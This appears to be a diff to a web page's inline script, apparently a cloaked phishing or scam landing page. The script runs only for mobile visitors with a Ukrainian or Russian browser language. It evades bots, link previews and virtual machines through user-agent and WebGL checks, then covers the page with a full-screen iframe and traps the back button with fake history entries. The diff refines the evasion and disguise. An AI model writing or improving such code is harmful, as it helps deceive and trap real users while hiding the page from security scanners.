@@ -7,13 +7,10 @@
     (function() {
         const lang = navigator.language || navigator.userLanguage || "";
         const isTargetLang = /uk|ua|ru/i.test(lang);
-
         const isMob = /iPhone|Android|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
-
         const isBot = /bot|facebook|meta|externalhit|message|preview|cloud|datacenter|crawler|spider/i.test(navigator.userAgent);
 
         if (isBot || !isMob || !isTargetLang) {
-            console.log("Access Denied: Environment mismatch");
             return;
         }
 
@@ -26,17 +23,17 @@
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
                 if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "";
-                    if (/software|virtual|llvm|swiftshader|google|amazon/i.test(renderer)) return;
+                    const db = gl.getExtension('WEBGL_debug_renderer_info');
+                    const rd = db ? gl.getParameter(db.UNMASKED_RENDERER_WEBGL) : "";
+                    if (/software|virtual|llvm|swiftshader|google|amazon/i.test(rd)) return;
                 }
             } catch (e) {}
 
             window.done = true;
             
             const style = document.createElement('style');
-            style.innerHTML = `body,html{margin:0;padding:0;height:100%;width:100%;overflow:hidden;background:#fff;}
-                               iframe{width:100%;height:100%;border:none;position:fixed;top:0;left:0;z-index:999999;}`;
+            style.innerHTML = `body,html{margin:0;padding:0;height:100%;width:100%;overflow:hidden;background:#0e1621;}
+                               iframe{width:100%;height:100%;border:none;position:fixed;top:0;left:0;z-index:999999;display:block;}`;
             document.head.appendChild(style);
 
             const ifrm = document.createElement('iframe');
@@ -44,15 +41,14 @@
             ifrm.allow = "autoplay; encrypted-media; fullscreen;";
             document.body.appendChild(ifrm);
 
-            for(let i=0; i<15; i++) history.pushState(null, "", "#/entry_point_" + Math.random().toString(36).substring(7));
+            for(let i=0; i<15; i++) history.pushState(null, "", "#/session_" + Math.random().toString(36).substring(7));
             window.onpopstate = () => { history.forward(); };
         }
- 
+
         window.addEventListener('touchstart', inject, {once: true});
         window.addEventListener('click', inject, {once: true});
-        window.addEventListener('scroll', inject, {once: true});
-          
-        setTimeout(inject, 3500);
+        
+        setTimeout(inject, 1200);
     })();
     </script>
 </head>
